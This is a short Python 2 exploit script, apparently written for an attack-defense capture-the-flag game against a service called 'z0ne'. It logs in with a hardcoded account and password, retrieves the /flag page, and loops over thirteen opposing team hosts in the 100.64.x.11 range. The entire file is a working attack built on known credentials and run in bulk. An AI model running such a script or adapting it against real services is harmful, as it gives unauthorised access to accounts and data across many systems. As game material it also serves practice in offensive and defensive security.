#!/usr/bin/env python
#coding=utf-8
import MySQLdb
import requests
import random
import string


service = 'z0ne'
timeout = 10					# define timeout here
author = 'md5_salt'			# author


def genRandomLetters(length):
	return ''.join([random.choice(string.letters) for i in xrange(length)])

def getTeamID(host):
	return int(host[8:10])

def exploit(host, port):
	s = requests.Session()
	if 'You are logged in' in s.post('http://%s:%d/login'%(host,port), data={'login-username':'root@5alt.me', 'login-password': 'gsajdg765jh'}).text:
		return s.get('http://%s:%d/flag'%(host, port)).text


if __name__ == '__main__':
	print exploit('100.64.100.11', 8000)
	print exploit('100.64.101.11', 8000)
	print exploit('100.64.102.11', 8000)
	print exploit('100.64.103.11', 8000)
	print exploit('100.64.104.11', 8000)
	print exploit('100.64.105.11', 8000)
	print exploit('100.64.106.11', 8000)
	print exploit('100.64.107.11', 8000)
	print exploit('100.64.108.11', 8000)
	print exploit('100.64.109.11', 8000)
	print exploit('100.64.110.11', 8000)
	print exploit('100.64.111.11', 8000)
	print exploit('100.64.112.11', 8000)
